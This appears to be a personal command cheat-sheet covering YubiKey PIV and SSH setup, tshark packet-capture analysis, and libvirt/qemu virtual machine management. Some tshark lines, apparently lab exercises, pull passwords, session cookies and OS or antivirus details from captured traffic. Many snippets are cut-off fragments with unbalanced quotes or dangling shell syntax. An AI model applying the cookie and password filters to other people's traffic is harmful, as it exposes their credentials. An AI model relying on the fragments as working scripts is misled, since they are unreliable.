systemd-debug-generator is a generator that reads the kernel command line and understands three options:

If the systemd.mask= option is specified and followed by a unit name, this unit is masked for the runtime, similar to the effect of systemctl(1)'s mask command. This is useful to boot with certain units removed from the initial boot transaction for debugging system startup. May be specified more than once.

If the systemd.wants= option is specified and followed by a unit name, a start job for this unit is added to the initial transaction. This is useful to start one or more additional units at boot. May be specified more than once.

If the systemd.debug-shell option is specified, the debug shell service "debug-shell.service" 



dir=$(mktemp -d)
SYSTEMD_LOG_LEVEL=debug /usr/lib/systemd/system-generators/systemd-fstab-generator \
        "$dir" "$dir" "$dir"
find $dir





--dump-configuration-items
--show-status=





password=$(oathtool --totp --base32 $secret_key)

 else
      password=$(ykman oath code $LAZY_CONNECT_TOTP_QUERY 2>/dev/null | awk '{print $2}')
    fi


echo -n "$password" | pbcopy




  List connected YubiKeys, only output serial number:
    $ ykman list --serials

    Show information about YubiKey with serial number 0123456:
    $ ykman --device 0123456 info




Use the PIV tool to change the pin from the default '123456' to a pin of your choice. "Pins" are not limited to numbers. You can use a secure password to increase security.

yubico-piv-tool -a change-pin -P 123456 -N TheNewPinHere


Step 5. Generate a certificate

yubico-piv-tool -s 9a -a generate --touch-policy=always -o public.pem


Step 6. Self-sign the certificate

yubico-piv-tool -a verify-pin -P 123456 -a selfsign-certificate -s 9a \
-S "/CN=SSH key/" -i public.pem -o cert.pem


Step 7. Import the self-signed certificate

yubico-piv-tool -a import-certificate -s 9a -i cert.pem


Step 8. Display the SSH Public key to be stored in the authorized_keys file on remote servers

ssh-keygen -D /usr/lib/x86_64-linux-gnu/opensc-pkcs11.so



yubico-piv-tool -s 9a -a generate -o public.pem

yubico-piv-tool -a verify-pin -P 123456 -a selfsign-certificate -s 9a \
-S "/CN=SSH key/" -i public.pem -o cert.pem

yubico-piv-tool -a import-certificate -s 9a -i cert.pem

ssh-keygen -D $OPENSC_LIBS/opensc-pkcs11.so


ssh -I $OPENSC_LIBS/opensc-pkcs11.so user@remote.example.com

****



How to Delete a certificate from a slot
yubico-piv-tool -a verify-pin -P 123456 -a delete-certificate -s 9c

How to change the Pin
yubico-piv-tool -a change-pin -P 123456 -N TheNewPinHere


How to change the Puk
yubico-piv-tool -a change-puk -P 12345678 -N TheNewPinHere




PKCS11Provider /usr/lib/i386-linux-gnu/opensc-pkcs11.so



#Get Key

ssh-keygen -D /usr/lib/x86_64-linux-gnu/opensc-pkcs11.so




#### To Generate with touch policy on

yubico-piv-tool -s 9a -a generate --touch-policy=always -o public.pem

#### Change Number of retries
yubico-piv-tool -averify -P 123456 -apin-retries --pin-retries=30 --puk-retries=3













	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	


#Creates new key with 1 year validity
$JAVE_HOME/jre/bin/keytool -genkey -keyalg RSA -alias my-test-cert -keystore my-test-cert.jks -storepass password -validity 360 -keysize 2048

#Adds existing jks stored private key into the existing AM jcecks keystore so you can sign SAML2 assertions etc
$JAVE_HOME/jre/bin/keytool -importkeystore -srckeystore my-test-cert.jks -destkeystore ~/am5/openam/keystore.jceks -storetype jceks


##-=================-##
##   [+] TShark
##-=================-##






    HTTP traffic from a PCAP file

    tshark -Y ‘http’ -r HTTP_traffic.pcap

    Show the IP packets sent from IP address 192.168.252.128 to IP address 52.32.74.91?

    tshark -r HTTP_traffic.pcap -Y "ip.src==192.168.252.128 && ip.dst==52.32.74.91"

    Only print packets containing GET requests?

    tshark -r HTTP_traffic.pcap -Y "http.request.method==GET"

    Print only source IP and URL for all GET request packets?

    tshark -r HTTP_traffic.pcap -Y "http.request.method==GET" -Tfields -e frame.time -e ip.src -e http.request.full_uri

    How many HTTP packets contain the "password" string?

    tshark -r HTTP_traffic.pcap -Y "http contains password”

    Which IP address was sent GET requests for New York Times (www.nytimes.com)?

    tshark -r HTTP_traffic.pcap -Y "http.request.method==GET && http.host==www.nytimes.com" -Tfields -e ip.dst

    What is the session ID being used by 192.168.252.128 for Amazon India store (amazon.in)?

    tshark -r HTTP_traffic.pcap -Y "ip contains amazon.in && ip.src==192.168.252.128" -Tfields -e ip.src -e http.cookie

    What type of OS the machine on IP address 192.168.252.128 is using (i.e. Windows/Linux/MacOS/Solaris/Unix/BSD)? Bonus: Can you also guess the distribution/flavor?

    tshark -r HTTP_traffic.pcap -Y "ip.src==192.168.252.128 && http" -Tfields -e http.user_agent

    Only show SSL traffic?

    tshark -Y ‘ssl’ -r HTTPS_traffic.pcap

    Only print the source IP and destination IP for all SSL handshake packets?

    tshark -r HTTPS_traffic.pcap -Y "ssl.handshake" -Tfields -e ip.src -e ip.dst

    List issuer name for all SSL certificates exchanged?

    tshark -r HTTPS_traffic.pcap -Y "ssl.handshake.certificate" -Tfields -e x509sat.printableString

    Print the IP addresses of all servers accessed over SSL?

    tshark -r HTTPS_traffic.pcap -Y "ssl && ssl.handshake.type==1" -Tfields -e ip.dst

    IP addresses associated with Ask Ubuntu servers (askubuntu.com)?

    tshark -r HTTPS_traffic.pcap -Y "ip contains askubuntu"

    IP address of the user who interacted with with Ask Ubuntu servers (askubuntu.com)?

    tshark -r HTTPS_traffic.pcap -Y "ip.dst==151.101.1.69 || ip.dst==151.101.193.69 || ip.dst==151.101.129.69 || ip.dst==151.101.65.69" -Tfields -e ip.src

    DNS servers were used by the clients for domain name resolutions?

    tshark -r HTTPS_traffic.pcap -Y "dns && dns.flags.response==0" -Tfields -e ip.dst

    Name of the antivirus solution? What are the IP addresses of the machines running this solution?

    tshark -r HTTPS_traffic.pcap -Y "ip contains avast" -Tfields -e ip.src



echo PCAP File Information
capinfos $pcapfile
echo ===================================================================
echo ---------Protocol Statistics-----------
tshark -r $pcapfile -q -z ptype,tree
echo ---------HTTP Statistics---------------
tshark -r $pcapfile -q -z http,stat,
echo -------HTTP Statistics with Rates------
tshark -r $pcapfile -q -z http,tree
echo ------------TOP 10 HTTP Request URL-----------------
echo ===================================================================
tshark -r $pcapfile -R http.request -T fields -e http.host | sed -e 's/?.*$//' | sed -e 's#^\(.*\)\t\(.*\)$#http://\1\2#' | sort | uniq -c | sort -rn | head -n 10
echo ===================================================================
echo ------------TOP 10 talkers by Source IP ------------------
echo ===================================================================
tshark -r $pcapfile -T fields -e ip.src | sort | uniq -c | sort -rn | head -10
echo ===================================================================
echo ------------TOP 10 talkers by DST IP ------------------
echo ===================================================================
tshark -r $pcapfile -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10
echo ===================================================================
echo ------------TOP 10 talkers by port usage or SYN attempts---------------
echo ===================================================================
tshark -r $pcapfile -T fields -e ip.src "tcp.flags.syn==1 && tcp.flags.ack==0" | sort | uniq -c | sort -rn | head -10
echo ===================================================================
echo ------------HTTP 10 Response Code 200 and Content Type--------------
echo ===================================================================
tshark -r $pcapfile -R http.response.code==200 -T fields -e "http.content_type" |sort |uniq -c | sort -rn | head -10
echo ===================================================================
echo ------------TOP HTTP Host and Request Method--------------
echo ===================================================================
tshark -r $pcapfile -R http.host -T fields -e http.host -e http.request.method |sort |uniq -c | sort -rn | head -10
echo ===================================================================
echo ------TOP 10 DNS Query DST Host ------
echo ===================================================================
tshark -r $pcapfile -T fields -e dns.qry.name -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10
echo ===================================================================
echo ------TOP 10 DNS Query by Soure IP ------
echo ===================================================================
tshark -r $pcapfile -T fields -e ip.src -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10
echo ===================================================================
echo ---------- TOP 10 ICMP Conversations ----------
echo ===================================================================
tshark -r $pcapfile -V icmp -T fields -e icmp.ident -e ip.src |sort |uniq -c | sort -rn | head -10


strings $file | grep ^http|head -1;done | awk -F/ '{print $3}' | sort | uniq -c | sort -nr | sed -n 1,15p




tshark -r $pcappath/$pcapfile1 -n -Y 'http.server' -T fields -e http.server | sort | uniq -c | sort -nr; press_enter;;
tshark -n -r $pcappath -Y 'http.server' -T fields -e http.server | sort | uniq -c | sort -nr; press_enter;;




awk '{print $NF}'			grabs the last field

tshark -G protocols | awk '{print $NF}' | sort | tr '\n' ' '


 tshark -i eth0 -f "port 9088" -w capture.pcap

list captured tcp streams): tshark -r capture.pcap -T fields -e tcp.stream | sort -u

dump the content of one particular tcp stream): tshark -nr capture.pcap -q -d tcp.port==9088,http -z follow,http,ascii,_your_stream_number


 
 tshark -r capture.pcapng -R dns

To save output as file:

tshark -r capture.pcapng -R dns -w filtered.pcapng -F pcapng

To save output as txt-file:

tshark -r capture.pcapng -R dns > filtered.txt

To save output as XML-file:

tshark -r capture.pcapng -R dns -T pdml > filtered.xml

 
 
 
 
 
 
 

tshark -i $Interfaz -f udp > UDPCapture.txt



curl -s ipinfo.io/$ipstranger | grep org | cut -d ":" -f 2 | sed 's/"//g' | sed 's/,//g')";

cat UDPCapture.txt | tail -n1 | grep -oi "[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}"|sort | head -n1)" = "$(hostname -I | sed 's/ //g')" ]; then # same conditional
cat UDPCapture.txt | tail -n1 | grep -oi "[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}"|sort | tail -n1);

curl -s ipinfo.io/$ipstranger | grep org | cut -d ":" -f 2 | sed 's/"//g' | sed 's/,//g')




tshark -2 -Tfields -e frame.time_epoch -e tcp.stream -e ip.src -e ssl.handshake.type -Y 'ssl.handshake' -r "$1"


tshark -c 20000 -i enp10s0 -w ./pcaps/capture_$CURRENT_TIME.pcap


TSHARK_PID=$(nohup tshark -i $INT.$i -n -w logs/tshark_vlan$i.$LOG_PREFIX.pcap >&3 3>&- & echo "$!"); } 3>&1


tshark -n -f "${CURRENTFILTER}" -i eth0 -T fields -e ip.src -e ip.dst > bpftest.txt


converting a .cap file to .txt:

tshark -V -r <infile.cap> > <outfile.txt>



Basic protocols dump:

# tshark -i any -f 'port http' -Y http -l -N nNC
# tshark -i any -f 'port smtp' -Y smtp -l -N nNC
# tshark -i any -f 'port imap' -Y imap -l -N nNC




Analyze already captured packets
tshark -r dump.cap -2 -R http -V

Extract a protocol flow No.10 as ASCII text:

# tshark -r dump.cap -q -z follow,tcp,ascii,10


Extract specific procotol fields as comma-separated lines:

tshark -r dump.cap -2 -R http -T fields -E separator=, -e tcp.stream -e http.request.method -e http.request.uri -e http.response.code -e http.response.phrase


Analyze traffic on non-standard port:

tshark -i any -f 'port 4000' -d tcp.port==4000,http -Y http






















Split in chinks of 10 minutes:

editcap -i 600 -A "2013-10-21 13:00:00" -B "2013-10-21 15:00:00" capture.pcapng part.pc


Splitting a file into time chunks

editcap -i <secondes per file> <infile> <outfile>












virsh pool-info $pool &>/dev/null || return
    path=$(virsh pool-dumpxml $pool | sed -n '/path/{s/.*<path>\(.*\)<\/path>.*/\1/;p}')

qemu-nbd -d /dev/nbd0




virsh dumpxml $NAME > $NAME.xml
virsh define $NAME.xml
	
	
	   VNC_PORT=$(virsh vncdisplay $domain | awk -F ":" '{print $2}' | sed 's/\<[0-9]\>/0&/')
	
	
	
	
	
	
	
	


qemu-img create -O qcow2 /media/VMs/windows.qcow2 8G
# qemu -boot d -cdrom /media/sf_VMs/winxp.iso -hda /media/VMs/windows.qcow2 -m 1024

# qemu -hda /media/VMs/windows.qcow2 -m 1024


qemu-system-x86_64 -hda /path/$File qcow2 -m 1024

# virsh snapshot-create cuckoo1 /media/sf_VMs/snap1.xml


virsh start cuckoo1
# virsh list –all



virsh snapshot-list 
 | awk '{print $1}'

virsh snapshot-create f15guest /var/tmp/snap1-f15guest.xml


virsh snapshot-create-as $i $SNAP_NAME

virsh snapshot-revert $i $SNAP_NAME

virsh resume $i



virsh pool-info $pool &>/dev/null || return
    path=$(virsh pool-dumpxml $pool | sed -n '/path/{s/.*<path>\(.*\)<\/path>.*/\1/;p}')


	
	
	
virsh vol-list --pool default
	
virsh pool-info $pool
path=$(virsh pool-dumpxml $pool | sed -n '/path/{s/.*<path>\(.*\)<\/path>.*/\1/;p}')
echo $path

virsh pool-define-as default dir - - - - "$path"
virsh pool-build default
virsh pool-start default
virsh pool-autostart default
	
	
virsh net-define ${NET}.xml
virsh net-autostart ${NET}
virsh net-start ${NET}
	
	
	
virsh pool-info default
virsh vol-create-as --name $name.qcow2 --capacity $size --format qcow2 --allocation $size --pool default

virt-install \
  --name=$name \
  --ram=$ram \
  --vcpus=$cpu,cores=$cpu \
  --os-type=linux \
  --os-variant=rhel6 \
  --virt-type=kvm \
  --disk "$pool_path/$name.qcow2",cache=writeback,bus=virtio,serial=$(uuidgen) \
  --cdrom "$pool_path/$iso_name" \
  --noautoconsole \
  --network network=fuel-pxe,model=$net_driver \
  --network network=$external_network,model=$net_driver \
  --graphics vnc,listen=0.0.0.0



STATUS=$(virsh dominfo $name | grep State | awk '{print $2}')
  
virsh start $name





Open Virt-Manager > click + > Bridge > br0 > Start Mode: onboot > Activate Now > Check eth0



	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	




see some information about the VM size, snapshot info:
qemu-img info /export/vmimgs/f15guest.qcow2

virsh snapshot-create-as --domain vm1 snap1 \ 
  --diskspec vda,file=/export/vmimages/disk-snap.qcow2,snapshot=external \ 
  --memspec file=/export/vmimages/mem-snap.qcow2,snapshot=external \ 
  --atomic

  
  qemu-img create -f raw <name>.img <Size>
  
  
  
  Launch VM with virt-install

    virt-install --name spinnaker \
    --ram 11096 \
    --vcpus=4 \
    --os-type linux \
    --os-variant=ubuntutrusty \
    --accelerate \
    --nographics -v  \
    --disk path=/var/lib/libvirt/images/ubuntu14-HD.img,size=8 \
    --extra-args "console=ttyS0" \
    --location /opt/ubuntu14.iso --force \
    --network bridge:virbr0
  
  
  
  
  qemu-img convert -f raw -O qcow2 /var/lib/libvirt/images/ubuntu14-HD.img /home/opsmx/spinnaker.qcow2
  
  
  
  Connect to tty of the VM (If tty is enables)
  virsh console <VM name>
  
  
  virsh dumpxml <VM name> - Dumps configuration of VM in xml format
virsh net-list - List the available networks











virsh migrate --live --verbose generic qemu+ssh://$destinationIP/system


ssh $destinationIP export LIBVIRT_DEFAULT_URI=qemu:///system
ssh  $destinationIP "export LIBVIRT_DEFAULT_URI=qemu:///system; virsh migrate --live --persistent generic qemu+ssh://$sourceIP/system"








brctl addif br0 tap
ifconfig br0 hw ether f4:6d:04:53:64:26
ifconfig tap0 hw ether 86:4f:06:d4:be:ad
ifconfig tap$a 0.0.0.0 promisc up



brctl show


#!/bin/sh
# switch=$(/sbin/ip route list | awk '/^default / { print $5 }')
switch=br0
/sbin/ifconfig $1 0.0.0.0 promisc up
/sbin/brctl addif ${switch} $1



sudo iptables -t nat -A POSTROUTING -o br0 -j MASQUERADE
sudo iptables -A FORWARD -i br0 -o gw1 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i gw1 -o br0 -j ACCEPT



qemu-system-x86_64 -enable-kvm -cpu host -smp ${numsmp} -m ${memsize} -drive file=${imgloc}/${imgfile},format=raw -boot d -cdrom ${isoloc}/ubuntu-16.04.3-server-amd64.iso -vnc :95 -net nic -net user -monitor tcp::9666,server,nowait -localtime 

qemu-system-x86_64 -enable-kvm -cpu host -smp ${numsmp} -m ${memsize} -drive file=${imgloc}/${imgfile},format=qcow2 -boot d -cdrom ${isoloc}/ubuntu-16.04.6-server-amd64.iso -vnc :95 -net nic -net user -localtime

qemu-system-x86_64 -enable-kvm -cpu host -smp ${numsmp} -m ${memsize} -drive file=${imgloc}/${imgfile},format=qcow2 -boot c -vnc :95 -net nic -net user -localtime











kvm -name smith -net nic,macaddr=1e:b6:86:69:4e:7a -net tap,ifname=tap2,script=no,downscript=no -net nic,vlan=1,macaddr=2e:d2:8a:d1:23:04 -net tap,vlan=1,ifname=tap3,script=no,downscript=no -hda /dev/vg-raid1/smith -hdb /dev/vg-raid1/smith-data -smp 2 -m 1G -nographic -boot c &


Twin.sh


kill -TERM "${pid}"



# Synchronise the virtual disk file
rsync --inplace --ignore-times --bwlimit=${BWLIMIT} --verbose --stats --human-readable --rsh "ssh -p $REMOTEPORT -l $REMOTEUSERNAME -i $REMOTEKEY" ${MOUNTPOINT}/${vmname}-snapshot/${diskname} ${REMOTEIP}:${REMOTEDIR}/${vmname}/incoming/


qemu-img create -f qcow2 ubuntu1604qcow2.img 8G


qemu-img create -f raw ubuntu1604raw.img 8G




qemu-img create -f qcow2 -b ubuntu1604qcow2.img ubuntu1604qcow2.ovl

qemu-img info ubuntu1604qcow2.ovl

qemu-img commit ubuntu1604qcow2.ovl

























modprobe tun

#bridge br0 setup
iface br0 inet static
       bridge_ports enp14s0
       address 192.168.1.216
       netmask 255.255.255.0
       gateway 192.168.1.1
       dns-nameservers 208.67.222.222
       dns-nameservers 80.80.80.80

#brige br1 setup
iface br1 inet static
       bridge_ports eno1
       address 167.157.28.31
       netmask 255.255.255.0
       gateway 167.157.28.1
       dns-nameservers 167.157.1.34
       dns-nameservers 8.8.8.8

















  
  
  
  
  convert a raw image file named image.img to a qcow2 image file.

$ qemu-img convert -f raw -O qcow2 image.img image.qcow2


convert a vmdk image file to a raw image file.

$ qemu-img convert -f vmdk -O raw image.vmdk image.img


convert a vmdk image file to a qcow2 image file.

$ qemu-img convert -f vmdk -O qcow2 image.vmdk image.qcow2


## VBoxManage: VDI (VirtualBox) to raw¶
VBoxManage clonehd ~/VirtualBox\ VMs/image.vdi image.img --format raw

















  

virsh list | grep running | awk '{print $2}' | tr "\\n" " "
  
  
  
virsh list --all |  grep "shut off" | awk '{print $2}' | tr "\\n" " "




qemu-img create -f qcow2 -o preallocation=metadata $DISK.new $DISK_SIZE



# Create new storage pool for new VM
"Creating storage pool"

virsh pool-create-as --name=${VMNAME} --type=dir --target=${VMDIR}/${VMNAME}




# Call virt-install to import the cloud image and create a new VM

virt-install --import --name=${VMNAME} --memory=${MEMORY} --vcpus=${CPUS} --cpu=${FEATURE} ${DISK_OPTION} ${CI_ISO_OPTION} ${NETWORK_OPTION} --os-type=${OS_TYPE} --os-variant=${OS_VARIANT} --noautoconsole ${GRAPHICS_OPTION} ${VIRT_INSTALL_EXTRA



virsh dominfo ${VMNAME} &>> ${VMNAME}.log



# Enable autostart if true
virsh autostart --domain ${VMNAME}




# Eject cdrom
virsh change-media ${VMNAME} --path ${VMDIR}/${VMNAME}/${CI_ISO} --eject --config &>> ${VMNAME}.log







if [ -f "/var/lib/libvirt/dnsmasq/${BRIDGE}.status" ]
    then
        outputn "Waiting for domain to get an IP address"
        MAC=$(virsh dumpxml ${VMNAME} | awk -F\' '/mac address/ {print $2}')
        while true
        do
            IP=$(grep -B1 $MAC /var/lib/libvirt/dnsmasq/$BRIDGE.status | head \
                 -n 1 | awk '{print $2}' | sed -e s/\"//g -e s/,//)
            if [ "$IP" = "" ]
            then
                sleep 1
            else
                ok
                break
            fi
done




"SSH to ${VMNAME}: 'ssh ${LOGIN_USER}@${IP}' or 'ssh ${LOGIN_USER}@${VMNAME}'"





qemu-img create -f ${FORMAT} -o size=$DISKSIZE,preallocation=metadata ${DISKDIR}/${DISKNAME} &>> ${DISKDIR}/${VMNAME}.log


virsh attach-disk ${VMNAME} --source $DISKDIR/${DISKNAME} --target ${TARGET} --subdriver ${FORMAT} --cache none --persistent &>> ${DISKDIR}/${VMNAME}.log





echo "Launching Armle machine"
qemu-system-arm -M versatilepb -kernel ~/qcow2/armle/vmlinuz-3.2.0-4-versatile -initrd ~/qcow2/armle/initrd.img-3.2.0-4-versatile -hda ~/qcow2/armle/debian_wheezy_armel_standard.qcow2 -append "root=/dev/sda1" -net nic -net user,hostfwd=tcp::2224-:22




qemu-system-aarch64 -m 1024 -cpu cortex-a57 -nographic -machine virt -kernel ~/qcow2/aarch64/trusty-server-cloudimg-arm64-vmlinuz-generic \-append 'root=/dev/vda1 rw rootwait mem=1024M console=ttyAMA0,38400n8 init=/usr/lib/cloud-init/uncloud-init ds=nocloud ubuntu-pass=randomstring' -drive if=none,id=image,file=~/qcow2/aarch64/trusty-server-cloudimg-arm64-disk1.img -device virtio-blk-device,drive=image -device virtio-net-device,netdev=user0 -netdev user,id=user0,hostfwd=tcp::2225-:22    





# Backup VM
    BAK_FILENAME="$vm"_`date +%y%m%d`.qcow2

	
	
	
	
	
	
	
# Create snapshot
echo "Create snapshot for $VM_NAME..."
virsh snapshot-create-as --domain $VM_NAME snap --diskspec vda,file=$VM_DIR/"$VM_NAME"-snap.qcow2 --disk-only --atomic --no-metadata --quiesce || { echo >&2 "Snapshot creation failed for $VM_NAME. Aborting backup."; exit 4; }


virsh list --all --name


# Check state 
virsh dominfo $VM | sed -n 's/State: *//p'


# Commit snapshot
  echo "Commit snapshot..."
  virsh blockcommit $VM_NAME vda --active --pivot











# Create CD-ROM ISO with cloud-init config
"Generating ISO for cloud-init"
genisoimage -output $CI_ISO -volid cidata -joliet -r $USER_DATA $META_DATA &>> ${VMNAME}.log


mkisofs -o $CI_ISO -V cidata -J -r $USER_DATA $META_DATA &>> ${VMNAME}.log






























virsh list | grep running | awk '{print $2}' | tr "\\n" " "
  
  
  









Use DD to byte copy the Digital Ocean partition, feeding it into gzip, and then transfer it over SSH to the Storage Location.

dd if=/dev/vda | gzip -1 - | ssh @ dd of=/storage/location/snapshot.image.gz



Step 3. Extract the gzipped image.

gunzip /storage/location/snapshot.image.gz



Step 4. Convert the DD image to a the qcow2 disk format with the 'qemu-img' utility.

qemu-img convert -O qcow2 /storage/location/snapshot.image /storage/location/snapshot.qcow2










